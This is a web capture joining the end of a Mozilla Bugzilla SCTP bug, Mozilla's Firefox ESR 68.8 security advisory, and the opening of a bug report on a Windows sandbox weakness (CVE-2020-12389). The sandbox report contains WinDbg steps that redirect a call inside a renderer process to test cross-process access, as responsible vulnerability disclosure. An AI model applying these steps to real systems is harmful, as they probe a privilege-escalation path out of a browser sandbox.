[Attachment #9142549](/attachment.cgi?id=9142549&action=edit "Bug 1632241: add SCTP auth token boundary check") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a106230_75935)• 5 years ago |

[Attachment #9142556](/attachment.cgi?id=9142556&action=edit "Bug 1632241: turn off SCTP auth and address reconfiguration") -
Flags: approval-mozilla-esr68? → approval-mozilla-esr68+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1632241#c12)• 5 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-esr68/rev/b43b8e87ef03>

<https://hg.mozilla.org/releases/mozilla-esr68/rev/3eafea41965b>

[status-firefox-esr68](/buglist.cgi?f1=cf_status_firefox_esr68&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed)

|  | [Cornel Ionce [:noni] [Hubs QA]](/user_profile?user_id=458186) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a485355_458186)• 5 years ago |

Flags: qe-verify-Whiteboard: [reported by GPZ, disclosure date 2020-07-18] → [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a586833_428608)• 5 years ago |

Whiteboard: [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage] → [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a587559_428608)• 5 years ago |

Whiteboard: [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+] → [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+][adv-ESR68.8+r]

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1632241#c13)• 5 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9144315)
— [Details](attachment.cgi?id=9144315&action=edit)

|  | [Frederik Braun [:freddy]](/user_profile?user_id=428608) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a591618_428608)• 5 years ago |

Whiteboard: [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+][adv-ESR68.8+r] → [reported by GPZ, disclosure date 2020-07-18][post-critsmash-triage][adv-main76+][adv-ESR68.8+]

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1632241#c14)• 5 years ago |
|  | |

Looks like Chrome is going to ship this fix in an update to their current Stable 81 soon and not wait for 83 (there was no 82)

See Also: → <https://bugs.chromium.org/p/chromium/issues/detail?id=1073602>

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1632241#c15)• 5 years ago |
|  | |

Chatted with adetaylor on the Chrome security team and we'll assign [CVE-2020-6831](https://www.cve.org/CVERecord?id=CVE-2020-6831) to this SCTP bug.

Alias: CVE-2020-6831

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1632241#a9324710_1689)• 4 years ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1632241&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Nils Ohlmeier [:drno]](/user_profile?user_id=489581)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_453dc894_20250119_135951.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2020-17

## Security Vulnerabilities fixed in Firefox ESR 68.8

Announced
May 5, 2020
Impact
critical
Products
Firefox ESR
Fixed in

* Firefox ESR 68.8

#### [#CVE-2020-12387: Use-after-free during worker shutdown](#CVE-2020-12387)

Reporter
Looben Yang
Impact
critical
##### Description

A race condition when running shutdown code for Web Worker led to a use-after-free vulnerability. This resulted in a potentially exploitable crash.

##### References

* [Bug 1545345](https://bugzilla.mozilla.org/show_bug.cgi?id=1545345)

#### [#CVE-2020-12388: Sandbox escape with improperly guarded Access Tokens](#CVE-2020-12388)

Reporter
James Forshaw of Google Project Zero
Impact
critical
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1618911](https://bugzilla.mozilla.org/show_bug.cgi?id=1618911)

#### [#CVE-2020-12389: Sandbox escape with improperly separated process types](#CVE-2020-12389)

Reporter
Niklas Baumstark
Impact
high
##### Description

The Firefox content processes did not sufficiently lockdown access control which could result in a sandbox escape.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1554110](https://bugzilla.mozilla.org/show_bug.cgi?id=1554110)

#### [#CVE-2020-6831: Buffer overflow in SCTP chunk input validation](#CVE-2020-6831)

Reporter
Natalie Silvanovich of Google Project Zero
Impact
high
##### Description

A buffer overflow could occur when parsing and validating SCTP chunks in WebRTC. This could have led to memory corruption and a potentially exploitable crash.

##### References

* [Bug 1632241](https://bugzilla.mozilla.org/show_bug.cgi?id=1632241)

#### [#CVE-2020-12392: Arbitrary local file access with 'Copy as cURL'](#CVE-2020-12392)

Reporter
Ophir LOJKINE
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP POST data of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in the disclosure of local files.

##### References

* [Bug 1614468](https://bugzilla.mozilla.org/show_bug.cgi?id=1614468)

#### [#CVE-2020-12393: Devtools' 'Copy as cURL' feature did not fully escape website-controlled data, potentially leading to command injection](#CVE-2020-12393)

Reporter
David Yesland
Impact
moderate
##### Description

The 'Copy as cURL' feature of Devtools' network tab did not properly escape the HTTP method of a request, which can be controlled by the website. If a user used the 'Copy as cURL' feature and pasted the command into a terminal, it could have resulted in command injection and arbitrary command execution.
*Note: this issue only affects Firefox on Windows operating systems.*

##### References

* [Bug 1615471](https://bugzilla.mozilla.org/show_bug.cgi?id=1615471)

#### [#CVE-2020-12395: Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](#CVE-2020-12395)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alexandru Michis, Jason Kratzer, philipp, Ted Campbell, Bas Schouten, André Bargull, and Karl Tomlinson reported memory safety bugs present in Firefox 75 and Firefox ESR 68.7. Some of these bugs showed evidence of memory corruption and we presume that with enough effort some of these could have been exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 76 and Firefox ESR 68.8](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1595886%2C1611482%2C1614704%2C1624098%2C1625749%2C1626382%2C1628076%2C1631508)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.1/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from bugzilla.mozilla.org_4bf6b2e7_20250119_135946.html ===


![](/static/v20250114.1/extensions/BMO/web/images/moz-fav-one-color-white-rgb.svg)

* [Mozilla Home](https://www.mozilla.org/)
* [Privacy](https://www.mozilla.org/privacy/websites/)
* [Cookies](https://www.mozilla.org/privacy/websites/#cookies)
* [Legal](https://www.mozilla.org/about/legal/)
# [Bugzilla](https://bugzilla.mozilla.org/home "Go to home page")

[Quick Search Tips](/page.cgi?id=quicksearch.html)
[Advanced Search](/query.cgi?format=advanced)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")

* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1554110)
* [XML](/show_bug.cgi?ctype=xml&id=1554110)

Closed
[Bug 1554110](/show_bug.cgi?id=1554110)
(CVE-2020-12389)

Opened 6 years ago
Closed 5 years ago

# Windows sandbox: renderer processes can open each and unrelated Chromium processes

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

Windows sandbox: renderer processes can open each and unrelated Chromium processes

## Categories

### (Core :: Security: Process Sandboxing, defect, P1)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Security%3A%20Process%20Sandboxing#Security%3A%20Process%20Sandboxing)

Security: Process Sandboxing
▾

Core :: Security: Process Sandboxing
For process sandboxing bugs. Generally this covers code under the security/sandbox/ source directory, but there is code elsewhere to hook the different platform process sandboxes into Gecko etc.
[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Security%3A%20Process%20Sandboxing&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Security%3A%20Process%20Sandboxing&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Security%3A%20Process%20Sandboxing)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

unspecified

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

P1

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

---

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Accessibility Severity | --- |
| --- | --- |
| Performance Impact | --- |
| Webcompat Score | --- |
| a11y-review | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr60 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr60&o1=equals&v1=wontfix) |
| firefox-esr68 | [76+](/buglist.cgi?f1=cf_tracking_firefox_esr68&o1=equals&v1=76%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox_esr68&o1=equals&v1=fixed) |
| firefox67.0.1 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox67_0_1&o1=equals&v1=wontfix) |
| firefox68 | [+](/buglist.cgi?f1=cf_tracking_firefox68&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox68&o1=equals&v1=wontfix) |
| firefox69 | [+](/buglist.cgi?f1=cf_tracking_firefox69&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox69&o1=equals&v1=wontfix) |
| firefox70 | [+](/buglist.cgi?f1=cf_tracking_firefox70&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox70&o1=equals&v1=wontfix) |
| firefox71 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox71&o1=equals&v1=wontfix) |
| firefox72 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox72&o1=equals&v1=wontfix) |
| firefox73 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox73&o1=equals&v1=wontfix) |
| firefox74 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox74&o1=equals&v1=wontfix) |
| firefox75 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox75&o1=equals&v1=wontfix) |
| firefox76 | --- | [fixed](/buglist.cgi?f1=cf_status_firefox76&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr60 |  | wontfix |
| firefox-esr68 | 76+ | fixed |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox67.0.1 |  | wontfix |
| firefox68 | + | wontfix |
| firefox69 | + | wontfix |
| firefox70 | + | wontfix |
| firefox71 |  | wontfix |
| firefox72 |  | wontfix |
| firefox73 |  | wontfix |
| firefox74 |  | wontfix |
| firefox75 |  | wontfix |
| firefox76 |  | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: niklas.baumstark, Assigned: bobowen)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/8877ff082c9a902bbf383dc11c1aeffc?d=mm&size=40)  [bobowen](/user_profile?user_id=458623)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/75bf31b48e75eedfebaa411a76a85155?d=mm&size=40)  [niklas.baumstark](/user_profile?user_id=423505)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/6ad7e6f8a605ca81446ea4c83d819fb2?d=mm&size=40)  [gcp](/user_profile?user_id=151147)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

15 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[CVE-2020-12388](/show_bug.cgi?id=1618911 "RESOLVED FIXED - Firefox: Default Content Process DACL Sandbox Escape")

[1555810](/show_bug.cgi?id=1555810 "RESOLVED INVALID - Make the privileged about/mozilla content processes Medium Integrity")

## Details

### (4 keywords, Whiteboard: [reporter-external] [client-bounty-form][post-critsmash-triage][adv-main76+][adv-ESR68.8+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2020-12389

[Keywords:](/describekeywords.cgi)

[csectype-priv-escalation](/buglist.cgi?keywords=csectype-priv-escalation&resolution=---),
[csectype-sandbox-escape](/buglist.cgi?keywords=csectype-sandbox-escape&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[reporter-external] [client-bounty-form][post-critsmash-triage][adv-main76+][adv-ESR68.8+]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a22063904_1689 "6 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [noni](/user_profile?user_id=458186) | [qe-verify](#a29368102_458186 "5 years ago") | - |
| --- | --- | --- |
| [noni](/user_profile?user_id=458186) | qe-verify | - |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (1 file, 1 obsolete file)

| [Bug 1554110: SetLockdownDefaultDacl for content process sandbox policy. r=jmathies!](/attachment.cgi?id=9069004)  [6 years ago](#c15)  [Bob Owen (:bobowen)](/user_profile?user_id=458623)   47 bytes, text/x-phabricator-request | abillings : [sec-approval+](#c19 "6 years ago") | [Details](/attachment.cgi?id=9069004&action=edit) | [Review](/attachment.cgi?id=9069004) |
| --- | --- | --- |
| [advisory.txt](/attachment.cgi?id=9144310)  [5 years ago](#c40)  [Frederik Braun [:freddy]](/user_profile?user_id=428608)   263 bytes, text/plain |  | [Details](/attachment.cgi?id=9144310&action=edit) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1554110#c0)• 6 years ago |
|  | |

Chromium uses the following code to prevent access between renderers, and from renderers to other low integrity processes: <https://cs.chromium.org/chromium/src/services/service_manager/sandbox/win/sandbox_win.cc?l=430>

```
  result = policy->SetTokenLevel(sandbox::USER_RESTRICTED_SAME_ACCESS,
                                 sandbox::USER_LOCKDOWN);
  if (result != sandbox::SBOX_ALL_OK)
    return result;
  // Prevents the renderers from manipulating low-integrity processes.
  result = policy->SetDelayedIntegrityLevel(sandbox::INTEGRITY_LEVEL_UNTRUSTED);

```

In SandboxBroker::SetSecurityLevelForContentProcess of Firefox with aSandboxLevel < 20 however, the delayed integrity level is set to INTEGRITY\_LEVEL\_LOW: <https://dxr.mozilla.org/mozilla-central/source/security/sandbox/win/src/sandboxbroker/sandboxBroker.cpp#432>

This means that content processes can open and manipulate each other, and also to some other Chromium-based processes such as the Chrome or Electron GPU process (an example is the Slack desktop application). I verified this in Firefox 67 by attaching to a renderer process with WinDbg and calling OpenProcess(PROCESS\_VM\_WRITE, 0, <PID>) to check if the result is non-zero. The steps for doing so are as follows (on Windows 10):

```
bp kernel32!ReadFile
g
# wait for breakpoint to hit
eq KERNEL32!_imp_ReadFile kernel32!OpenProcessStub
eq @rsp deadbeef
r @rcx=0x20
r @rdx=0
r @r8=0n<PID>
g
# will crash at 0xdeadbeef because we changed the return address
r @rax   # non-zero if opening was successfully

```

One direct consequence of this within Firefox itself is that a web renderer process can escalate privileges to file and web extension processes which are potentially more trusted. See also [bug 1538028](/show_bug.cgi?id=1538028 "RESOLVED FIXED - Privilege escalation from web to file process"), file processes can read the entire filesystem.

Another consequence is that we can get control of a process before it calls LowerToken(). This clearly goes against the idea of the sandbox, even though it probably only means a minor increase of kernel attack surface in the case of Firefox. If a Chromium-like win32k lockdown mechanism will ever be introduced in the future, this would be a bypass.

Also, I could imagine that this could affect site isolation in the future.

Flags: sec-bounty?

|  | [:Gijs (he/him)](/user_profile?user_id=159069) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1554110#a10512_159069)• 6 years ago |

Group: firefox-core-security → dom-core-securityType: task → defectComponent: Security → Security: Process SandboxingProduct: Firefox → Core

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1554110#c1)• 6 years ago |
|  | |

Thanks Niklas, it's useful having this explicitly in a bug (which I don't think we already have), but this is a known issue.

We are working towards moving to untrusted integrity level at the same time as win32k lockdown.

Many of the things that block that also block us from using untrusted integrity.

|  | [Jim Mathies [:jimm]](/user_profile?user_id=279663) |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1554110#c2)• 6 years ago |
|  | |

Need to hook this up to a INTEGRITY\_LEVEL\_UNTRUSTED bug.

Priority: -- → P2

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1554110#c3)• 6 years ago |
|  | |

In the meanwhile, you're fine with essentially presenting the entire host filesystem to a compromised renderer?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1554110#c4)• 6 years ago |
|  | |

he did say "working towards moving to untrusted integrity level" -- that's not "fine with it", it's just hard retrofitting into a decade plus of the wrong architecture.

> If a Chromium-like win32k lockdown mechanism will ever be introduced in the future, this would be a bypass.

We're working hard on that, too.

Status: UNCONFIRMED → NEWEver confirmed: trueKeywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1554110#c5)• 6 years ago |
|  | |

I guess I misposed the question: Unless Firefox requires doing OpenProcess for legitimate purposes, shouldn't it be possible to fix this bug without moving to untrusted integrity, and would that not be a warranted approach to this issue?

|  | [Niklas Baumstark](/user_profile?user_id=423505)  Reporter |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1554110#c6)• 6 years ago |
|  | |

Somebody already wrote about the fact that this is possibly publicly, probably without realizing the security implications: <https://github.com/0vercl0k/CVE-2019-9810#organization>

|  | [Bob Owen (:bobowen)](/user_profile?user_id=458623)  Assignee |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1554110#c7)• 6 years ago |
|  | |

(In reply to Daniel Veditz [:dveditz] from [comment #4](/show_bug.cgi?id=1554110#c4 "RESOLVED FIXED - Windows sandbox: renderer processes can open each and unrelated Chromium processes"))

